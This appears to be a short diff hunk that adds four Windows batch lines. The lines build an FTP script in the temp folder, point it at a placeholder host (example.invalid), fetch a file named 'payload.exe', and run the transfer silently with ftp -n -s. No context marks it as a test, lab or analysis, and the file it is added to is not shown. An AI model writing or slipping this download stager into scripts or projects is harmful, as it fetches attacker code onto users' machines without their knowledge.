@@ -1,0 +1,4 @@
+echo open example.invalid >> %TEMP%\f.txt
+echo get payload.exe >> %TEMP%\f.txt
+ftp -n -s:%TEMP%\f.txt
+
